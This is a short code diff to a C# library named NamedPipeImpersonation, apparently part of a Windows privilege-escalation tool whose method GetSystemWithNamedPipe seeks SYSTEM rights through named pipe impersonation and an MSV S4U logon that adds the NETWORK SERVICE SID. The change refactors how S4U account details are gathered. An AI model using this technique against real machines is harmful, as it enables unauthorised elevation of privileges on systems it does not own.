@@ -17,15 +17,23 @@ namespace NamedPipeImpersonation.Library
     {
         public static bool GetSystemWithNamedPipe()
         {
-            var status = false;
             var isImpersonated = false;
+            bool status = Utilities.GetS4uLogonAccount(
+                out string s4uUser,
+                out string s4uDomain,
+                out LSA_STRING pkgName,
+                out TOKEN_SOURCE tokenSource);
+
+            if (!status)
+            {
+                Console.WriteLine("[-] Failed to determin S4U logon account information.");
+                return status;
+            }
 
             do
             {
                 int error;
                 string pipeMessage;
-                string s4uUser = Environment.UserName;
-                string s4uDomain = Environment.UserDomainName;
                 var hPrimaryToken = IntPtr.Zero;
                 var startupInfo = new STARTUPINFO
                 {
@@ -156,7 +164,12 @@ namespace NamedPipeImpersonation.Library
                 {
                     Console.WriteLine("[>] Trying to S4U logon.");
 
-                    status = Utilities.ImpersonateWithMsvS4uLogon(s4uUser, s4uDomain, new List<string> { "S-1-5-20" });
+                    status = Utilities.ImpersonateWithMsvS4uLogon(
+                        s4uUser,
+                        s4uDomain,
+                        in pkgName,
+                        in tokenSource,
+                        new List<string> { "S-1-5-20" });
 
                     if (!status)
                     {
